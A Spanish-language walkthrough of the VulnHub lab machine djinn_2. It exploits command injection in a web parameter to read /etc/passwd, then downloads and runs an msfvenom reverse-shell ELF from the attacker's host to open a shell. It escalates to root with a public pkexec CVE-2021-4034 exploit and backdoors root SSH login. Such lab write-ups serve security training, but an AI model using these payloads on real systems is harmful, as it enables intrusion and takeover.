---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# djinn\_2 VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sV <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 10:37 EDT
Nmap scan report for 192.168.5.163
Host is up (0.00034s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              14 Jan 12  2020 creds.txt
| -rw-r--r--    1 0        0             280 Jan 19  2020 game.txt
|_-rw-r--r--    1 0        0             275 Jan 19  2020 message.txt
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:3c:7f:28:79:44:01:ca:55:d2:48:6d:06:5d:cd:ac (RSA)
|   256 71:e4:82:a4:95:30:a0:47:d5:14:fe:3b:c0:10:6c:d8 (ECDSA)
|_  256 ce:77:48:33:be:27:98:4b:5e:4d:62:2f:a3:33:43:a7 (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   GenericLines: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     @0xmzfr, Thanks for hiring me.
|     Since I know how much you like to play game. I'm adding another game in this.
|     Math game
|     Catch em all
|     Exit
|     Stop acting like a hacker for a damn minute!!
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     @0xmzfr, Thanks for hiring me.
|     Since I know how much you like to play game. I'm adding another game in this.
|     Math game
|     Catch em all
|_    Exit
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: 405 Method Not Allowed
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: Lost in space
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=6/2%Time=665C83C0%P=x86_64-pc-linux-gnu%r(
SF:NULL,1DD,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20_
SF:_\x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x
SF:20__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'
SF:_\x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_
SF:\x20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x2
SF:0\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\
SF:|\x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n\nHey\x20@0xmzfr,\x20Thanks\x20for\x20hiring\x20me\.\nSince\x20I\x20
SF:know\x20how\x20much\x20you\x20like\x20to\x20play\x20game\.\x20I'm\x20ad
SF:ding\x20another\x20game\x20in\x20this\.\n1\.\x20Math\x20game\n2\.\x20Ca
SF:tch\x20em\x20all\n3\.\x20Exit\n>\x20")%r(GenericLines,20B,"\x20\x20____
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x20__\x20_
SF:__\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x20\x20\x2
SF:0___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x20\\\x20/
SF:\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\
SF:x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|\x20\|\x2
SF:0\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\
SF:x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\___\|\x20\
SF:x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nHey\x20@0xmzfr,\x
SF:20Thanks\x20for\x20hiring\x20me\.\nSince\x20I\x20know\x20how\x20much\x2
SF:0you\x20like\x20to\x20play\x20game\.\x20I'm\x20adding\x20another\x20gam
SF:e\x20in\x20this\.\n1\.\x20Math\x20game\n2\.\x20Catch\x20em\x20all\n3\.\
SF:x20Exit\n>\x20Stop\x20acting\x20like\x20a\x20hacker\x20for\x20a\x20damn
SF:\x20minute!!\n");
MAC Address: 00:0C:29:D0:F2:64 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 192.168.5.163

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.63 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

```shell
get creds.txt

get game.txt

get message.txt
```

Lo que contiene cada uno es lo siguiente...

> creds.txt

```
nitu:7846A$56
```

> game.txt

```
@0xmzfr I would like to thank you for hiring me. I won't disappoint you like SAM.
Also I've started implementing the secure way of authorizing the access to our 
network. I have provided @nitish81299 with the beta version of the key fob
hopes everything would be good.

- @Ugtan_
```

> message.txt

```
@nitish81299, you and sam messed it all up. I've fired sam for all the fuzz he created and 
this will be your last warning if you won't put your shit together than you'll be gone as well.
I've hired @Ugtan_ as our new security head, hope  he'll do something good.

- @0xmzfr
```

### Puerto 1337

Si nos vamos a este puerto mediante una pagina web, encontraremos la siguiente pagina...

```
 ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Hey @0xmzfr, Thanks for hiring me.
Since I know how much you like to play game. I'm adding another game in this.
1. Math game
2. Catch em all
3. Exit
> Stop acting like a hacker for a damn minute!!
```

Pero si nos conectamos de la siguiente manera...

```shell
nc <IP> 1337
```

Info:

```
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Hey @0xmzfr, Thanks for hiring me.
Since I know how much you like to play game. I'm adding another game in this.
1. Math game
2. Catch em all
3. Exit
> 
```

Por lo que parece es un juego...

Si completamos el juego de matematicas, nos dira lo siguiente...

```
> 1
I see you wanna do some Mathematics. I think you know the rule
Let's start then
4 + 1
> 5
9 + 3
> 12
Look up at the stars and not down at your feet. Try to make sense of what you see, and wonder about what makes the universe exist. Be curious.

-- Stephen (not morris)
```

### Puerto 5000

Si hacemos lo siguiente...

```shell
curl -I -X GET http://<IP>:5000
```

Info:

```
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: text/html
Allow: POST, OPTIONS
Content-Length: 178
Server: Werkzeug/0.16.0 Python/3.6.9
Date: Sun, 02 Jun 2024 14:57:22 GMT
```

Vemos que solo admite `POST`, por lo que haremos lo siguiente...

```shell
curl -X POST -d "comment=<script>alert('XSS');</script>" http://192.168.5.163:5000
```

Info:

```
Access Denied!!
```

Por lo que entendemos que tiene que haber algun login en alguna parte...

### Puerto 7331

Si nos vamos a la web, encontraremos una pagina normal, pero si escaneamos puertos...

```shell
gobuster dir -u http://<IP>:7331/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.163:7331/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 10]
/robots.txt           (Status: 200) [Size: 10]
/source               (Status: 200) [Size: 1280]
/wish                 (Status: 200) [Size: 456]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos lo siguiente, en el `/robots.txt` encontramos esto...

```
/letshack
```

Lo que parece ser una `URL` de un directorio...

Pero si vamos a `/source` nos descarga un archivo que contiene lo siguiente...

```python
import re

from time import sleep



import requests



URL = "http://{}:5000/?username={}&password={}"





def check_ip(ip: str):

    """

    Check whether the input IP is valid or not

    """

    if re.match(r'^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])'

                '(\.(?!$)|$)){4}$', ip):

        return True

    else:

        return False





def catcher(host, username, password):

    try:

        url = URL.format(host, username, password)

        requests.post(url)

        sleep(3)

    except Exception:

        pass



    print("Unable to connect to the server!!")





def main():

    print("If you have this then congratulations on being a part of an awesome organization")

    print("This key will help you in connecting to our system securely.")

    print("If you find any issue please report it to ugtan@djinn.io")



    ip = input('\nIP of the machine: ')

    username = input('Your username: ')

    password = input('Your password: ')



    if ip and check_ip(ip) and username == "REDACTED" and password == "REDACTED":

        print("Verifiying %s with host %s " % (username, ip))

        catcher(ip, username, password)

    else:

        print("Invalid IP address given")





if __name__ == "__main__":

    main()
```

Lo que parece un script de `python` de un login en el puerto `5000` y con las credenciales que encontramos anterior mente probaremos...

```shell
mv source source.py
```

```shell
python3 source.py
```

Si hacemos eso e intentamos meter las credenciales anteriores no nos funcionara, por lo que haremos lo siguiente con la siguiente herramienta...

### curl

Siguiendo ese codigo de `python` haremos lo siguiente...

```shell
curl -X POST 'http://<IP>:5000/?username=ls&password=test'
```

Info:

```
app.py
```

Por lo que fue exitoso la inyeccion de codigo...

Crearemos un script de `python` para que nos codifique la `URL` y asi podamos de hacer inyeccion de codigo concatenando varios comandos...

```python
import urllib.parse

username = "<COMMAND>"
password = "test"

# Codificar los parámetros de la URL
encoded_username = urllib.parse.quote(username)
encoded_password = urllib.parse.quote(password)

# Construir la URL codificada
url = f"http://<IP>:5000/?username={encoded_username}&password={encoded_password}"

print(url)
```

Si donde pone `<COMMAND>` ponemos un `cat /etc/passwd` y lo ejecutamos, obtendremos lo siguiente...

```shell
python3 <SCRIPT_PYTHON>.py
```

Info:

```
http://<IP>:5000/?username=cat%20/etc/passwd&password=test
```

Por lo que lo enviamos con `curl`...

```shell
curl -X POST 'http://<IP>:5000/?username=cat%20/etc/passwd&password=test'
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
nitish:x:1000:1000:nitish,,,:/home/nitish:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ugtan:x:1001:1001:umang taneja,,,:/home/ugtan:/bin/bash
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
postfix:x:112:117::/var/spool/postfix:/usr/sbin/nologin
```

Por lo que vemos hay 2 usuarios llamados `nitish` y `ugtan`...

Lo que haremos sera un `payload` para poder hacernos una shell mediante `metasploit` ya que esta sanitizadas las `Reverse Shell's`...

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.elf
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: payload.elf
```

Preparamos el `metasploit`...

```shell
msfconsole -q
```

```shell
#Utilizar el siguiente exploit
use multi/handler

#Configurar payload anterior
set payload linux/x86/shell_reverse_tcp

#Configuracion
show options

set LHOST <IP>

set LPORT <PORT>

#Iniciar para estar a la escucha
run
```

Una vez estando a la escucha en otra pestaña, vamos a pasarnos nuestro `payload` al servidor victima mediante `python`...

```shell
python3 -m http.server
```

```shell
curl -X POST 'http://<VICTIM_IP>:5000/?username=wget%20-P%20/tmp/%20http%3A//<YOUR_IP>%3A8000/payload.elf&password=test'
```

Lo enviamos al directorio `/tmp`...

```shell
curl -X POST 'http://<IP>:5000/?username=ls%20-la%20/tmp&password=test'
```

Info:

```
total 44
drwxrwxrwt 10 root     root     4096 Jun  3 00:38 .
drwxr-xr-x 23 root     root     4096 Dec 21  2019 ..
drwxrwxrwt  2 root     root     4096 Jun  2 20:06 .font-unix
drwxrwxrwt  2 root     root     4096 Jun  2 20:06 .ICE-unix
-rw-r--r--  1 www-data www-data  152 Jun  3 00:29 payload.elf
drwx------  3 root     root     4096 Jun  2 20:06 systemd-private-20399c7c7bf14ecbae4fbc795198fa4a-systemd-resolved.service-uPLypV
drwx------  3 root     root     4096 Jun  2 20:06 systemd-private-20399c7c7bf14ecbae4fbc795198fa4a-systemd-timesyncd.service-1BIRZa
drwxrwxrwt  2 root     root     4096 Jun  2 20:06 .Test-unix
drwx------  2 root     root     4096 Jun  2 23:47 vmware-root
drwxrwxrwt  2 root     root     4096 Jun  2 20:06 .X11-unix
drwxrwxrwt  2 root     root     4096 Jun  2 20:06 .XIM-unix
```

Como veremos se paso todo perfectamente, ahora haremos lo siguiente para ejecutarlo...

```shell
curl -X POST 'http://<IP>:5000/?username=chmod%20%2Bx%20/tmp/payload.elf&password=test'
```

Le añadimos permisos de ejecucion y ahora lo ejecutamos...

```shell
curl -X POST 'http://<IP>:5000/?username=/tmp/payload.elf&password=test'
```

Una vez hecho eso si nos volvemos a nuestro `metasploit` habremos hecho conexion...

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.5.162:443 
[*] Command shell session 1 opened (192.168.5.162:443 -> 192.168.5.163:46830) at 2024-06-02 15:19:27 -0400

whoami
www-data
```

Ya seremos el usuario `www-data`...

Si hacemos lo siguiente...

```
find / -type f -perm -4000 -ls 2>/dev/null
   285086     80 -rwsr-xr-x   1 root     root        80056 Apr  2  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   285640    100 -rwsr-sr-x   1 root     root       101208 Apr 16  2018 /usr/lib/snapd/snap-confine
   262612     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   287000    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   538740     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2018 /usr/lib/policykit-1/polkit-agent-helper-1
   262602     44 -rwsr-xr--   1 root     messagebus    42992 Nov 16  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   283747     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
   262276     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2018 /usr/bin/chfn
   285442     40 -rwsr-xr-x   1 root     root          37136 Jan 25  2018 /usr/bin/newuidmap
   262491    148 -rwsr-xr-x   1 root     root         149080 Jan 18  2018 /usr/bin/sudo
   285441     40 -rwsr-xr-x   1 root     root          37136 Jan 25  2018 /usr/bin/newgidmap
   262411     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2018 /usr/bin/passwd
   262341     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2018 /usr/bin/gpasswd
   283134     20 -rwsr-xr-x   1 root     root          18448 Mar 10  2017 /usr/bin/traceroute6.iputils
   262400     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2018 /usr/bin/newgrp
   285527     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2018 /usr/bin/pkexec
   262278     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2018 /usr/bin/chsh
   536814     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   536260    144 -rwsr-xr-x   1 root     root         146128 Dec  1  2017 /bin/ntfs-3g
   524358     64 -rwsr-xr-x   1 root     root          64424 Mar 10  2017 /bin/ping
   524376     44 -rwsr-xr-x   1 root     root          44664 Jan 25  2018 /bin/su
   524393     28 -rwsr-xr-x   1 root     root          26696 Mar 16  2018 /bin/umount
   524349     44 -rwsr-xr-x   1 root     root          43088 Mar 16  2018 /bin/mount
```

Veremos esta linea de aqui...

```
285527     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2018 /usr/bin/pkexec
```

Esto actua como un `/bin/bash` con permisos de `SUID`, por lo que haremos lo siguiente...

URL = https://github.com/Almorabea/pkexec-exploit

Esto nos lo llevaremos al servidor victima, ya sea copiando el contenido de `python` o transferirlo con algun comando como `curl` o `wget`, una vez teniendolo dentro...

```shell
chmod +x CVE-2021-4034.py
```

```shell
python3 CVE-2021-4034.py
```

Parecera que no funciona y se quedara pillado en la opcion de elegir `n`, pero si hacemos `^C` y despues cuando nos pregunte le damos a la `n` de nuevo y hacemos un `whoami` veremos que somos el usuario `root`...

Info:

```
Do you want to choose a custom payload? y/n (n use default payload)  n
^C
Abort session 1? [y/N]  n
[*] Aborting foreground process in the shell session
sh: 1: : not found
whoami
root
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Por lo que leeremos la flag de la siguiente manera...

```shell
./proof.sh
```

> proof.sh (flagfinal)

```
TERM environment variable not set.
./proof.sh: line 9: figlet: command not found
djinn-2 pwned...
__________________________________________________________________________

Proof: cHduZWQgZGppbm4tMiBsaWtlIGEgYm9zcwo=
Path: /root
Date: Mon Jun 3 00:59:40 IST 2024
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)

If you enjoyed this then consider donating (https://mzfr.github.io/donate/)
so I can continue to make these kind of challenges.
```

Y para pulirlo mas, si queremos conectarnos desde un `ssh` con `root`...

```shell
passwd root

#Pasos
Enter new UNIX password: root
Retype new UNIX password: root
passwd: password updated successfully
```

```shell
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config >/dev/null
```

```shell
sudo systemctl restart sshd
```

Y ahora nos conectamos desde el `ssh`...

```shell
ssh root@<IP>
```

Info:

```
root@192.168.5.163's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  3 01:04:26 IST 2024

  System load:  0.03              Processes:           155
  Usage of /:   28.5% of 9.78GB   Users logged in:     1
  Memory usage: 37%               IP address for eth0: 192.168.5.163
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

244 packages can be updated.
136 updates are security updates.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sun Jun  2 20:06:21 2024
root@djinn:~#
```

Y ya seriamos `root` desde el `ssh` con una shell mas comoda...
